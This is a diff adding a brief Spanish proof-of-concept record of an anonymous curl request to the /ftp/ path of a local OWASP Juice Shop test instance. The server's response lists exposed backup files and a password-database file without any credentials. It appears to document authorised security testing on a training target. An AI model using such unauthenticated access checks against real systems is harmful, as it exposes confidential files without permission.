@@ -1,0 +1,18 @@
+# PoC-04 — Comprobación anónima mediante curl (extracto de la salida proporcionada)
+# Fecha: 17-11-2026, 07:22:00 GMT (cabecera Date)
+# Objetivo: únicamente OWASP Juice Shop local, a través de WAF en 127.0.0.1:8081
+# La solicitud no incluye Authorization ni Cookie.
+
+Comando:
+curl.exe -i --max-time 20 --noproxy "*" -H "Accept: application/json" http://127.0.0.1:8081/ftp/
+
+Respuesta observada:
+HTTP/1.1 200 OK
+Date: Tue, 17 Nov 2026 07:22:00 GMT
+Server: Apache
+Content-Type: application/json; charset=utf-8
+Content-Length: 211
+
+["quarantine","acquisitions.md","announcement_encrypted.md","coupons_2013.md.bak","eastere.gg","encrypt.pyc","incident-support.kdbx","legal.md","package-lock.json.bak","package.json.bak","suspicious_errors.yml"]
+
+Nota: esta es una transcripción resumida de una prueba ejecutada por el usuario, no una nueva ejecución.
